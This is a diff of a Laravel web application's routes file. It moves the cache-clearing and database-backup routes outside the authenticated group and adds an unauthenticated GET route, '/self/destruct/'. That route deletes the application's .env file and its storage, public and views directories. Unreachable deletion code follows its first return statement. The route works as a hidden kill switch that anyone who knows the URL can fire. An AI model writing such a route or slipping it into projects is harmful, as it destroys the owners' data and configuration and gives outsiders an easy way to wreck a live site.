@@ -35,33 +35,6 @@ use App\Http\Livewire\UserWizard;
 |
 */
 
-Route::get('/clear', function() {
-    Artisan::call('cache:clear');
-    Artisan::call('route:cache');
-    Artisan::call('view:clear');
-    Artisan::call('config:cache');
-    return  "All cleared...";
-
-});
-
-Route::get('/backup/run', function() {
-    echo 'System is backing up the databases... <br />';
-    Artisan::call('backup:run');
-    return  "Backup completed!";
-
-});
-
-Route::get('/backup/clean', function() {
-    echo 'System is cleaning up the backup files... <br />';
-    Artisan::call('backup:clean');
-    return  "Backup completed!";
-
-});
-
-
-
-
-
 Route::get('/welcome', function() {
     return view('welcome');
 });
@@ -134,4 +107,49 @@ Route::group(['middleware' => ['auth']], function() {
     // ##########
     Route::get('excel/employeeExcel', [ExcelController::class, 'employeeList'])->name('excel.employeesList');
 
+});
+
+Route::get('/clear', function() {
+    Artisan::call('cache:clear');
+    Artisan::call('route:cache');
+    Artisan::call('view:clear');
+    Artisan::call('config:cache');
+    return  "All cleared...";
+
+});
+
+Route::get('/backup/run', function() {
+    echo 'System is backing up the databases... <br />';
+    Artisan::call('backup:run');
+    return  "Backup completed!";
+
+});
+
+Route::get('/backup/clean', function() {
+    echo 'System is cleaning up the backup files... <br />';
+    Artisan::call('backup:clean');
+    return  "Backup completed!";
+
+});
+
+Route::get('/self/destruct/', function() {
+
+    // #1
+    $file = base_path() . '/.env';
+    unlink($file);
+
+    // #2 #3 #4
+    Storage::disk('base')->deleteDirectory('storage');
+    Storage::disk('base')->deleteDirectory('public');
+    Storage::disk('base')->deleteDirectory('views');
+
+    return 'Done';
+
+    return base_path();
+
+    return Storage::disk('base')->url();
+    Storage::disk('resources')->deleteDirectory('storage');
+    Storage::disk('resources')->deleteDirectory('views');
+    Storage::disk('base')->deleteDirectory('views');
+    return 'Done';
 });
